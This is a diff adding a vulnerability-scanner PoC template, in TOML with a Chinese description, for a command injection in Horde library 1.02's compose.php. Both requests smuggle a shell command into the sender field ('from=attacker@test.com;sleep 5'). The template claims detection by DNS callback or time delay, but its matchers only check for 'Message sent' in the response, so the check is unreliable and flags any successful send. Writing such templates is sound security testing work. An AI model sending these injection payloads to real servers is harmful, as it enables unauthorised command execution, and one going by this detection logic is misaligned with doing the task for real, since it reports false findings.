@@ -1,0 +1,56 @@
+[info]
+author = "AVE"
+description = "Horde library 1.02 在处理邮件发件人地址时未正确过滤 shell 元字符（如分号、管道符），攻击者可通过构造恶意 from 地址实现远程命令执行。发送包含 shell 注入 payload 的 HTTP 请求，通过 out-of-band DNS 或时间延迟检测命令是否成功执行。"
+id = "POC-AVE-2000-1010"
+name = "Horde library 1.02 命令注入漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-1010"]
+vuln_id = [
+    "CVE-2000-0910",
+    "AVE-2000-1010",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/horde/imp/compose.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "to=test@test.com&from=attacker@test.com%3Bsleep%205&subject=test&body=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Message sent",
+    "sent successfully",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/imp/compose.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "to=test@test.com&from=attacker@test.com%3Bsleep%205&subject=test&body=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Message sent",
+    "sent successfully",
+]
